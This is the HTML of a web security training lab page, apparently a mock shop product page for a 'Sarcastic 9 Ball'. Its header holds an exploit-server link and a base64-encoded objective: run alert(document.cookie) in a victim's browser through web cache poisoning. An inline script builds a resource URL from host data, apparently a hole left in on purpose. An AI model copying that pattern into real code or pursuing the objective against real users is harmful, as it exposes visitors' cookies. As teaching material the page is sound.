                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="product">
                        <h3>Sarcastic 9 Ball</h3>
                        <img src="/resources/images/rating2.png">
                        <div id="price">$98.00</div>
                        <img src="/image/productcatalog/products/40.jpg">
                        <label>Description:</label>
                        <p>Ever find yourself asking stupid questions that you should know the answer to? Luckily the Sarcastic 9 Ball is here to put an end to obvious questions!</p>
<p>With blunt and brutally honest answers like: 'Well, duh!' and 'Yes, if you leave me alone!' you and your friends will get the right answer every shake, albeit with a withering put down to boot. The Sarcastic Nine Ball is the perfect gift for that loved one or friend that just won't let up with those nagging questions. Give it as a present, or simply carry it with you and get an ironic answer for their stupidity every time!</p>
<p>This product is Ridley's spin on the magic eight ball that traditional offers sound advice and guidance, whereas the Nine Ball takes a far blunter approach, an approach that's well needed sometimes.</p>
<p>Get your own back on those annoying question askers or give as a gift to someone who's confused constantly!</p>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
